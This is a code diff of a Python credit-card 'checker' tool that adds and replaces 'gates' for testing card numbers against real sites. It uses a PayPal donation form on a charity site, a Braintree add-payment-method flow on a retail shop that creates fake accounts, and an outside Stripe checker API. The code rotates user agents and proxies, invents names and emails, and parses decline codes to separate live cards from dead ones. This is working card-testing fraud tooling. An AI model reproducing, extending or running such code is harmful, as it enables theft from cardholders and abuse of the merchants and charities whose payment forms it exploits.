@@ -41,12 +41,11 @@ def generate_user_agent():
     return random.choice(ua_list)
 
 # ============================================================================
-# PayPal Donation Checker – Fixed Site (alhijrahtrust.org)
+# New working PayPal gate (uses 2africa.org)
 # ============================================================================
-def check_paypal_fixed(cc, proxy=None):
+def check_paypal_working(cc, proxy=None):
     """
-    Checks a card on the hardcoded site alhijrahtrust.org.
-    Accepts proxy (string) and uses it.
+    Checks a card on a working PayPal donation site.
     Returns (message, status) where status is 'APPROVED' or 'DECLINED' or 'ERROR'.
     """
     try:
@@ -59,15 +58,14 @@ def check_paypal_fixed(cc, proxy=None):
             yy = '20' + yy
 
         # --- Fixed site data ---
-        SITE_URL = 'https://alhijrahtrust.org/donations/old-phase-2-archive/'
-        BASE_URL = 'https://alhijrahtrust.org'
+        SITE_URL = 'https://2africa.org/donate-now/'
+        BASE_URL = 'https://2africa.org'
         UA = generate_user_agent()
 
         # --- Extract initial form data ---
         def extract_data():
             s = requests.Session()
             s.verify = False
-            # Apply proxy if given
             if proxy:
                 s.proxies.update(format_proxy(proxy))
             headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
@@ -186,9 +184,7 @@ def check_paypal_fixed(cc, proxy=None):
             },
             'application_context': {'vault': False},
         }
-        # This request also uses the proxy (the session already has proxy)
-        confirm_resp = s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=pp_headers, json=json_data, timeout=30)
-        # We don't need to parse this response; proceed to approval
+        s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=pp_headers, json=json_data, timeout=30)
 
         # --- Step 4: Approve order ---
         mp2 = MultipartEncoder(fields={
@@ -250,347 +246,12 @@ def check_paypal_fixed(cc, proxy=None):
     except Exception as e:
         return f"Exception: {str(e)[:100]}", "ERROR"
 
+# Replace old PayPal functions with the working one
+check_paypal_fixed = check_paypal_working
+check_paypal_general = check_paypal_working
 
 # ============================================================================
-# PayPal Donation Checker – General (any site, any amount) with proxy support
-# ============================================================================
-class DonationChecker:
-    def __init__(self, website_url, donation_amount, proxy=None):
-        self.session = requests.Session()
-        if proxy:
-            self.session.proxies.update(format_proxy(proxy))
-        self.user_agent = generate_user_agent()
-        self.base_url = website_url.rstrip('/')
-        self.donation_page = f'{self.base_url}/donations/'
-        self.min_amount = '0.01'
-        self.donation_amount = str(donation_amount)
-
-    def generate_random_name(self):
-        first_names = ["James", "John", "Robert", "Michael", "William",
-                      "David", "Richard", "Joseph", "Thomas", "Charles"]
-        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones",
-                     "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
-        return random.choice(first_names), random.choice(last_names)
-
-    def generate_email(self, first_name, last_name):
-        domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
-        return f"{first_name.lower()}{last_name.lower()}{random.randint(100,999)}@{random.choice(domains)}"
-
-    def parse_credit_card(self, cc_data):
-        parts = cc_data.strip().split("|")
-        card_number = parts[0]
-        month = parts[1]
-        year = parts[2]
-        cvv = parts[3].strip()
-        if "20" in year:
-            year = year.split("20")[1]
-        return card_number, month, year, cvv
-
-    def get_page_data(self):
-        headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': self.user_agent,
-        }
-        response = self.session.get(self.donation_page, headers=headers)
-        form_data = {}
-        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text)
-        if id_form1:
-            form_data['id_form1'] = id_form1.group(1)
-        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text)
-        if id_form2:
-            form_data['id_form2'] = id_form2.group(1)
-        nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text)
-        if nonec:
-            form_data['nonec'] = nonec.group(1)
-        enc = re.search(r'"data-client-token":"(.*?)"', response.text)
-        if enc:
-            dec = base64.b64decode(enc.group(1)).decode('utf-8')
-            access_token = re.search(r'"accessToken":"(.*?)"', dec)
-            if access_token:
-                form_data['access_token'] = access_token.group(1)
-        return form_data
-
-    def process_initial_donation(self, form_data, first_name, last_name, email):
-        headers = {
-            'accept': '*/*',
-            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': self.user_agent,
-            'x-requested-with': 'XMLHttpRequest',
-        }
-        data = [
-            ('give-honeypot', ''),
-            ('give-price-id', 'custom'),
-            ('give-form-id-prefix', form_data.get('id_form1', '')),
-            ('give-form-id', form_data.get('id_form2', '')),
-            ('give-form-title', 'Donate'),
-            ('give-current-url', self.donation_page),
-            ('give-form-url', self.donation_page),
-            ('give-form-minimum', self.min_amount),
-            ('give-form-maximum', '999999.99'),
-            ('give-form-hash', form_data.get('nonec', '')),
-            ('give-amount', self.donation_amount),
-            ('give_stripe_payment_method', ''),
-            ('payment-mode', 'paypal-commerce'),
-            ('give_first', first_name),
-            ('give_last', last_name),
-            ('give_company_option', 'no'),
-            ('give_company_name', ''),
-            ('give_email', email),
-            ('give_comment', ''),
-            ('card_name', f"{first_name},{last_name}"),
-            ('card_exp_month', ''),
-            ('card_exp_year', ''),
-            ('give_agree_to_terms', '1'),
-            ('give_action', 'purchase'),
-            ('give-gateway', 'paypal-commerce'),
-            ('action', 'give_process_donation'),
-            ('give_ajax', 'true'),
-        ]
-        return self.session.post(f'{self.base_url}/wp-admin/admin-ajax.php', headers=headers, data=data)
-
-    def create_paypal_order(self, form_data, first_name, last_name, email):
-        headers = {
-            'accept': '*/*',
-            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': self.user_agent,
-        }
-        params = {'action': 'give_paypal_commerce_create_order'}
-        multipart_data = MultipartEncoder([
-            ('give-honeypot', (None, '')),
-            ('give-price-id', (None, 'custom')),
-            ('give-form-id-prefix', (None, form_data.get('id_form1', ''))),
-            ('give-form-id', (None, form_data.get('id_form2', ''))),
-            ('give-form-title', (None, 'Donate')),
-            ('give-current-url', (None, self.donation_page)),
-            ('give-form-url', (None, self.donation_page)),
-            ('give-form-minimum', (None, self.min_amount)),
-            ('give-form-maximum', (None, '999999.99')),
-            ('give-form-hash', (None, form_data.get('nonec', ''))),
-            ('give-amount', (None, self.donation_amount)),
-            ('give_stripe_payment_method', (None, '')),
-            ('payment-mode', (None, 'paypal-commerce')),
-            ('give_first', (None, first_name)),
-            ('give_last', (None, last_name)),
-            ('give_company_option', (None, 'no')),
-            ('give_company_name', (None, '')),
-            ('give_email', (None, email)),
-            ('give_comment', (None, '')),
-            ('card_name', (None, f"{first_name},{last_name}")),
-            ('card_exp_month', (None, '')),
-            ('card_exp_year', (None, '')),
-            ('give_agree_to_terms', (None, '1')),
-            ('give-gateway', (None, 'paypal-commerce')),
-        ])
-        headers['content-type'] = multipart_data.content_type
-        response = self.session.post(
-            f'{self.base_url}/wp-admin/admin-ajax.php',
-            params=params,
-            headers=headers,
-            data=multipart_data
-        )
-        return response.json()['data']['id']
-
-    def confirm_payment_source(self, token, access_token, card_number, month, year, cvv):
-        headers = {
-            'authority': 'cors.api.paypal.com',
-            'accept': '*/*',
-            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-            'authorization': f'Bearer {access_token}',
-            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
-            'content-type': 'application/json',
-            'origin': 'https://assets.braintreegateway.com',
-            'paypal-client-metadata-id': '739b1263dc2b6bec1e7d9b8ae229ec25',
-            'referer': 'https://assets.braintreegateway.com/',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'cross-site',
-            'user-agent': self.user_agent,
-        }
-        json_data = {
-            'payment_source': {
-                'card': {
-                    'number': card_number,
-                    'expiry': f'20{year}-{month}',
-                    'security_code': cvv,
-                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}
-                }
-            },
-            'application_context': {'vault': False}
-        }
-        response = self.session.post(
-            f'https://cors.api.paypal.com/v2/checkout/orders/{token}/confirm-payment-source',
-            headers=headers,
-            json=json_data
-        )
-        return response
-
-    def approve_order(self, token, form_data, first_name, last_name, email):
-        headers = {
-            'accept': '*/*',
-            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': self.user_agent,
-        }
-        params = {'action': 'give_paypal_commerce_approve_order', 'order': token}
-        multipart_data = MultipartEncoder([
-            ('give-honeypot', (None, '')),
-            ('give-price-id', (None, 'custom')),
-            ('give-form-id-prefix', (None, form_data.get('id_form1', ''))),
-            ('give-form-id', (None, form_data.get('id_form2', ''))),
-            ('give-form-title', (None, 'Donate')),
-            ('give-current-url', (None, self.donation_page)),
-            ('give-form-url', (None, self.donation_page)),
-            ('give-form-minimum', (None, self.min_amount)),
-            ('give-form-maximum', (None, '999999.99')),
-            ('give-form-hash', (None, form_data.get('nonec', ''))),
-            ('give-amount', (None, self.donation_amount)),
-            ('give_stripe_payment_method', (None, '')),
-            ('payment-mode', (None, 'paypal-commerce')),
-            ('give_first', (None, first_name)),
-            ('give_last', (None, last_name)),
-            ('give_company_option', (None, 'no')),
-            ('give_company_name', (None, '')),
-            ('give_email', (None, email)),
-            ('give_comment', (None, '')),
-            ('card_name', (None, f"{first_name},{last_name}")),
-            ('card_exp_month', (None, '')),
-            ('card_exp_year', (None, '')),
-            ('give_agree_to_terms', (None, '1')),
-            ('give-gateway', (None, 'paypal-commerce')),
-        ])
-        headers['content-type'] = multipart_data.content_type
-        return self.session.post(
-            f'{self.base_url}/wp-admin/admin-ajax.php',
-            params=params,
-            headers=headers,
-            data=multipart_data
-        )
-
-    def get_decline_reason(self, text):
-        decline_patterns = {
-            'true': f'Charged {self.donation_amount}$',
-            'COMPLETED': f'Charged {self.donation_amount}$',
-            'DO_NOT_HONOR': 'DO_NOT_HONOR',
-            'ACCOUNT_CLOSED': 'ACCOUNT_CLOSED',
-            'PAYER_ACCOUNT_LOCKED_OR_CLOSED': 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
-            'LOST_OR_STOLEN': 'LOST_OR_STOLEN',
-            'CVV2_FAILURE': 'CVV2_FAILURE',
-            'SUSPECTED_FRAUD': 'SUSPECTED_FRAUD',
-            'INVALID_ACCOUNT': 'INVALID_ACCOUNT',
-            'REATTEMPT_NOT_PERMITTED': 'REATTEMPT_NOT_PERMITTED',
-            'ACCOUNT_BLOCKED_BY_ISSUER': 'ACCOUNT_BLOCKED_BY_ISSUER',
-            'ORDER_NOT_APPROVED': 'ORDER_NOT_APPROVED',
-            'PICKUP_CARD_SPECIAL_CONDITIONS': 'PICKUP_CARD_SPECIAL_CONDITIONS',
-            'PAYER_CANNOT_PAY': 'PAYER_CANNOT_PAY',
-            'INSUFFICIENT_FUNDS': 'INSUFFICIENT_FUNDS',
-            'GENERIC_DECLINE': 'GENERIC_DECLINE',
-            'COMPLIANCE_VIOLATION': 'COMPLIANCE_VIOLATION',
-            'TRANSACTION_NOT_PERMITTED': 'TRANSACTION_NOT_PERMITTED',
-            'PAYMENT_DENIED': 'PAYMENT_DENIED',
-            'INVALID_TRANSACTION': 'INVALID_TRANSACTION',
-            'RESTRICTED_OR_INACTIVE_ACCOUNT': 'RESTRICTED_OR_INACTIVE_ACCOUNT',
-            'SECURITY_VIOLATION': 'SECURITY_VIOLATION',
-            'DECLINED_DUE_TO_UPDATED_ACCOUNT': 'DECLINED_DUE_TO_UPDATED_ACCOUNT',
-            'INVALID_OR_RESTRICTED_CARD': 'INVALID_OR_RESTRICTED_CARD',
-            'EXPIRED_CARD': 'EXPIRED_CARD',
-            'CRYPTOGRAPHIC_FAILURE': 'CRYPTOGRAPHIC_FAILURE',
-            'TRANSACTION_CANNOT_BE_COMPLETED': 'TRANSACTION_CANNOT_BE_COMPLETED',
-            'DECLINED_PLEASE_RETRY': 'DECLINED_PLEASE_RETRY',
-            'TX_ATTEMPTS_EXCEED_LIMIT': 'TX_ATTEMPTS_EXCEED_LIMIT',
-        }
-        for pattern, message in decline_patterns.items():
-            if pattern in text:
-                return message
-        try:
-            data = json.loads(text)
-            if 'data' in data and 'error' in data['data']:
-                return data['data']['error']
-        except:
-            pass
-        return 'UNKNOWN_ERROR'
-
-    def check_card(self, cc_data):
-        try:
-            card_number, month, year, cvv = self.parse_credit_card(cc_data)
-            first_name, last_name = self.generate_random_name()
-            email = self.generate_email(first_name, last_name)
-            form_data = self.get_page_data()
-            if not form_data:
-                return "Failed to extract form data"
-            self.process_initial_donation(form_data, first_name, last_name, email)
-            token = self.create_paypal_order(form_data, first_name, last_name, email)
-            confirm_resp = self.confirm_payment_source(token, form_data['access_token'],
-                                                       card_number, month, year, cvv)
-            if isinstance(confirm_resp, str):
-                return confirm_resp
-            response = self.approve_order(token, form_data, first_name, last_name, email)
-            result = self.get_decline_reason(response.text)
-            if 'true' in response.text:
-                try:
-                    data = response.json()
-                    last_status = data["data"]["order"]["purchase_units"][0]["payments"]["captures"][-1]["status"]
-                    if last_status == 'COMPLETED':
-                        return f'Charged {self.donation_amount}$'
-                except:
-                    pass
-            return result
-        except Exception as e:
-            return f"ERROR: {str(e)}"
-
-
-# Global configuration for general PayPal gate
-PAYPAL_SITE = "http://bavashdesigns.com"  # default, should be changed
-PAYPAL_AMOUNT = 0.05
-
-def check_paypal_general(cc, proxy=None):
-    """
-    Checks a card using the DonationChecker with globally configured site and amount.
-    Accepts proxy and passes it to the checker.
-    """
-    try:
-        checker = DonationChecker(PAYPAL_SITE, PAYPAL_AMOUNT, proxy=proxy)
-        result = checker.check_card(cc)
-        if f'Charged {PAYPAL_AMOUNT}$' in result:
-            return result, "APPROVED"
-        else:
-            return result, "DECLINED"
-    except Exception as e:
-        return f"Exception: {str(e)}", "ERROR"
-
-
-# ============================================================================
-# Stripe API Gate
+# Stripe API Gate (unchanged, uses external API)
 # ============================================================================
 STRIPE_SITE = "newzealandtrends.com"
 STRIPE_API_URL = "https://stripe-checker-production-e6a0.up.railway.app/v1/stripe/auth"
@@ -601,32 +262,26 @@ def check_stripe_api(cc, proxy=None):
     Returns (message, status) where status is 'APPROVED' or 'DECLINED'.
     """
     try:
-        # Clean and parse CC
         cc = cc.strip()
         parts = cc.split('|')
         if len(parts) < 4:
             return "Invalid format", "ERROR"
         cc_num, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
 
-        # Build the URL: parameters go after /auth/ (no ?)
         import urllib.parse
         param_string = f"site={STRIPE_SITE}&cc={cc_num}%7C{mm}%7C{yy}%7C{cvv}"
         url = f"{STRIPE_API_URL}/{param_string}"
 
-        # Prepare session with proxy if provided
         session = requests.Session()
         if proxy:
             session.proxies.update(format_proxy(proxy))
 
-        # Make request
         response = session.get(url, timeout=30, verify=False)
         response.raise_for_status()
         data = response.json()
 
-        # Extract result field
         result = data.get('result', '').lower()
 
-        # Determine status
         if 'charged' in result or 'approved' in result or 'success' in result:
             return result, "APPROVED"
         else:
@@ -641,60 +296,173 @@ def check_stripe_api(cc, proxy=None):
     except Exception as e:
         return f"Exception: {str(e)[:100]}", "ERROR"
 
-
 # ============================================================================
-# Generic Onyx API Gate (all gates share the same base URL and key)
+# Local Braintree gate (replaces the broken Onyx version)
 # ============================================================================
-ONYX_API_BASE = "https://onyxenvbot.up.railway.app"
-API_KEY = "yashikaaa"   # can be changed by owner
-
-def _check_onyx_gate(cc, gateway_path, gateway_name):
+def check_braintree(cc, proxy=None):
+    """
+    Local Braintree tokenization gate using shop.trifectanutrition.com
+    Returns (message, status) where status is 'APPROVED' or 'DECLINED' or 'ERROR'.
+    """
     try:
         cc = cc.strip()
         parts = cc.split('|')
         if len(parts) < 4:
             return "Invalid format", "ERROR"
-        cc_num, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
+        c, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
+        if len(yy) == 2:
+            yy = '20' + yy
 
-        import urllib.parse
-        cc_encoded = urllib.parse.quote(cc)
-        url = f"{ONYX_API_BASE}/{gateway_path}/key={API_KEY}/cc={cc_encoded}"
+        # Generate random email
+        username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
+        email = f"{username}@gmail.com"
+        user_agent = generate_user_agent()
 
         session = requests.Session()
-        response = session.get(url, timeout=60, verify=False)
-        response.raise_for_status()
-        data = response.json()
+        if proxy:
+            session.proxies.update(format_proxy(proxy))
+        session.verify = False
 
-        result_status = data.get('status', '').lower()
-        response_msg = data.get('response', '')
+        # Step 1: Create user account
+        headers = {'User-Agent': user_agent}
+        json_data = {'email': email, 'password': email}
+        resp = session.post('https://shop.trifectanutrition.com/wp-json/tf/v1/fb/user/create/email',
+                            headers=headers, json=json_data, timeout=30)
 
-        if result_status == 'approved':
-            return response_msg, "APPROVED"
+        # Step 2: Get address nonce
+        resp = session.get('https://shop.trifectanutrition.com/my-account/edit-address/billing/',
+                           headers=headers, timeout=30)
+        address_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', resp.text).group(1)
+
+        # Step 3: Set billing address
+        data = {
+            'billing_first_name': 'Hussein',
+            'billing_last_name': 'Alfuraijii',
+            'billing_company': '',
+            'billing_country': 'CA',
+            'billing_address_1': '3480 Granada Ave',
+            'billing_city': 'Los Angeles',
+            'billing_state': 'AB',
+            'billing_postcode': 'T7S 1E8',
+            'billing_phone': '3153153152',
+            'billing_email': email,
+            'save_address': 'Save address',
+            'woocommerce-edit-address-nonce': address_nonce,
+            '_wp_http_referer': '/my-account/edit-address/billing/',
+            'action': 'edit_address',
+        }
+        session.post('https://shop.trifectanutrition.com/my-account/edit-address/billing/',
+                     headers=headers, data=data, timeout=30)
+
+        # Step 4: Get payment method page and nonces
+        resp = session.get('https://shop.trifectanutrition.com/my-account/add-payment-method/',
+                           headers=headers, timeout=30)
+        payment_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', resp.text).group(1)
+        client_token_nonce = re.search(r'client_token_nonce":"([^"]+)"', resp.text).group(1)
+
+        # Step 5: Get Braintree client token
+        data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_token_nonce}
+        resp = session.post('https://shop.trifectanutrition.com/wordpress/wp-admin/admin-ajax.php',
+                            headers=headers, data=data, timeout=30)
+        enc = resp.json()['data']
+        dec = base64.b64decode(enc).decode('utf-8')
+        auth_fingerprint = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
+
+        # Step 6: Tokenize card with Braintree GraphQL
+        braintree_headers = {
+            'authority': 'payments.braintree-api.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
+            'authorization': f'Bearer {auth_fingerprint}',
+            'braintree-version': '2018-05-10',
+            'content-type': 'application/json',
+            'origin': 'https://assets.braintreegateway.com',
+            'referer': 'https://assets.braintreegateway.com/',
+            'user-agent': user_agent,
+        }
+        json_data = {
+            'clientSdkMetadata': {
+                'source': 'client',
+                'integration': 'custom',
+                'sessionId': 'ae0e96cd-7aa2-418c-8fba-6627701d117c',
+            },
+            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
+            'variables': {
+                'input': {
+                    'creditCard': {
+                        'number': c,
+                        'expirationMonth': mm,
+                        'expirationYear': yy,
+                        'cvv': cvc,
+                    },
+                    'options': {'validate': False},
+                },
+            },
+            'operationName': 'TokenizeCreditCard',
+        }
+        resp = requests.post('https://payments.braintree-api.com/graphql',
+                             headers=braintree_headers, json=json_data, timeout=30)
+        token = resp.json()['data']['tokenizeCreditCard']['token']
+
+        # Step 7: Add payment method
+        data = {
+            'payment_method': 'braintree_credit_card',
+            'wc-braintree-credit-card-card-type': 'master-card',
+            'wc-braintree-credit-card-3d-secure-enabled': '',
+            'wc-braintree-credit-card-3d-secure-verified': '',
+            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
+            'wc_braintree_credit_card_payment_nonce': token,
+            'wc_braintree_device_data': '',
+            'wc-braintree-credit-card-tokenize-payment-method': 'true',
+            'woocommerce-add-payment-method-nonce': payment_nonce,
+            '_wp_http_referer': '/my-account/add-payment-method/',
+            'woocommerce_add_payment_method': '1',
+        }
+        resp = session.post('https://shop.trifectanutrition.com/my-account/add-payment-method/',
+                            headers=headers, data=data, timeout=30)
+        text = resp.text
+
+        # Step 8: Parse result
+        if 'added' in text or 'Payment method successfully added.' in text:
+            return "Approved ✅", "APPROVED"
+        elif 'Duplicate card exists' in text:
+            return "Approved ✅ (Duplicate)", "APPROVED"
+        elif 'risk_threshold' in text:
+            return "RISK: Retry this BIN later.", "DECLINED"
+        elif 'Card Issuer Declined CVV' in text:
+            return "Declined CVV", "DECLINED"
+        elif 'avs' in text or 'cvv' in text:
+            return "AVS/CVV Failure", "DECLINED"
         else:
-            return response_msg, "DECLINED"
+            # Try to extract reason
+            match = re.search(r'Reason: (.+?)\s*</li>', text)
+            if match:
+                reason = match.group(1)
+                return f"Declined: {reason}", "DECLINED"
+            return "Unknown error", "ERROR"
 
-    except requests.exceptions.Timeout:
-        return "Timeout", "ERROR"
-    except requests.exceptions.RequestException as e:
-        return f"Request error: {str(e)}", "ERROR"
-    except json.JSONDecodeError:
-        return "Invalid API response", "ERROR"
     except Exception as e:
         return f"Exception: {str(e)[:100]}", "ERROR"
 
-# Define each gate using the helper
-def check_chaos(cc, proxy=None): return _check_onyx_gate(cc, "chaos", "Chaos Auth")
-def check_adyen(cc, proxy=None): return _check_onyx_gate(cc, "adyen", "Adyen Auth")
-def check_app_auth(cc, proxy=None): return _check_onyx_gate(cc, "app-auth", "App Based Auth")
-def check_payflow(cc, proxy=None): return _check_onyx_gate(cc, "payflow", "Payflow")
-def check_random(cc, proxy=None): return _check_onyx_gate(cc, "random", "Random Auth")
-def check_shopify_onyx(cc, proxy=None): return _check_onyx_gate(cc, "shopify", "Shopify")
-def check_skrill(cc, proxy=None): return _check_onyx_gate(cc, "skrill", "Skrill")
-def check_braintree(cc, proxy=None): return _check_onyx_gate(cc, "braintree", "Braintree")
-def check_stripe_onyx(cc, proxy=None): return _check_onyx_gate(cc, "stripe", "Stripe")
-def check_arcenus(cc, proxy=None): return _check_onyx_gate(cc, "arcenus", "Arcenus")
-def check_random_stripe(cc, proxy=None): return _check_onyx_gate(cc, "random-stripe", "Random Stripe")
-def check_razorpay(cc, proxy=None): return _check_onyx_gate(cc, "razorpay", "RazorPay")
-def check_payu(cc, proxy=None): return _check_onyx_gate(cc, "payu", "PayU")
-def check_sk_gateway(cc, proxy=None): return _check_onyx_gate(cc, "sk", "SK Gateway")
-def check_paypal_onyx(cc, proxy=None): return _check_onyx_gate(cc, "paypal", "PayPal")
+# ============================================================================
+# The following gates are disabled because the Onyx API is not working.
+# They are replaced with dummy functions that return an error.
+# If you later restore the Onyx API, you can uncomment the original code.
+# ============================================================================
+def _onyx_unavailable(gate_name):
+    return lambda cc, proxy=None: (f"{gate_name} unavailable (Onyx API down)", "ERROR")
+
+check_chaos = _onyx_unavailable("Chaos")
+check_adyen = _onyx_unavailable("Adyen")
+check_app_auth = _onyx_unavailable("App Auth")
+check_payflow = _onyx_unavailable("Payflow")
+check_random = _onyx_unavailable("Random")
+check_shopify_onyx = _onyx_unavailable("Shopify")
+check_skrill = _onyx_unavailable("Skrill")
+check_stripe_onyx = _onyx_unavailable("Stripe")
+check_arcenus = _onyx_unavailable("Arcenus")
+check_random_stripe = _onyx_unavailable("Random Stripe")
+check_razorpay = _onyx_unavailable("RazorPay")
+check_payu = _onyx_unavailable("PayU")
+check_sk_gateway = _onyx_unavailable("SK Gateway")
+check_paypal_onyx = _onyx_unavailable("PayPal")
